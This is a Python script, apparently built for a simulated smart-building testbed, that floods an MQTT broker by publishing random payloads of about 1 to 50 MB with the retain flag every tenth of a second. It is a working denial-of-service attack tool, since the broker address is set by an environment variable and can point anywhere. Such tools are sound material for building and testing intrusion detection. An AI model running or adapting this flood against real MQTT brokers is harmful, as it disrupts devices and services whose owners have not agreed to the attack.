import os
import datetime
import paho.mqtt.client as mqtt
import simpy.rt
import string
from random import choice, randrange

BROKER = os.getenv('SENS_BROKER', 'localhost')
PORT = os.getenv('SENS_PORT', 1883)
NAME = os.getenv('SENS_NAME', 'heavy_flood_0')
ROOM = os.getenv('SENS_ROOM', 'attack_room')
FLOOR = os.getenv('SENS_FLOOR', 'floor0')
SIM_FACTOR = float(os.getenv('SIM_FACTOR', 1))
# for infinite duration use 'inf'
SIM_DURATION = float(os.getenv('SIM_DURATION', 'inf'))
ATT_DURATION = float(os.getenv('ATTACK_DURATION', '3'))

attack_topic = "crazy_building/{}/{}/{}/".format(
    FLOOR, ROOM, NAME)


def main():
    starting_time = datetime.datetime.now()
    print("Simulation started at {}".format(starting_time))
    env = simpy.rt.RealtimeEnvironment(factor=SIM_FACTOR, strict=True)

    client = mqtt.Client(generate_ID())

    client.connect(BROKER, keepalive=600)
    print("Connected.")

    payload_size = randrange(10e5, 5*10e6) #1 #10e6  # 10M payload
    payload = bytearray(os.urandom(int(payload_size)))
    print('Payload generated')

    client.subscribe(attack_topic)
    print("Subscribed to attack topic")
    client.publish(attack_topic, retain=True, payload=payload, qos=2)

    attack_process = env.process(quick_flood_attack(env, client, payload))
    env.process(supervisor(env, attack_process, starting_time, ATT_DURATION))
    env.run(until=float(SIM_DURATION))

    client.loop_start()
    print("Simulation complete")


def quick_flood_attack(env, cli, payload):
    i = 0
    try:
        while True:
            cli.publish(attack_topic, retain=True, payload=payload)
            i += 1
            yield env.timeout(0.1)
    except simpy.Interrupt:
        print("Attack Interrupted, {} pub. sent".format(i))


def supervisor(env, attack_process, starting_time, attack_duration):
    print("Heavy flood starts now, will last {} sim. seconds".format(attack_duration))
    yield env.timeout(attack_duration)
    attack_process.interrupt()


def generate_ID():
    return 'CL-' + \
           FLOOR[::len(FLOOR) - 1] + '-' + ROOM[::len(ROOM) - 1] + '-' + \
           NAME + \
           ''.join(choice(string.ascii_lowercase) for i in range(randrange(5, 15)))


if __name__ == "__main__":
    print("+++ ATTACKER +++")
    main()
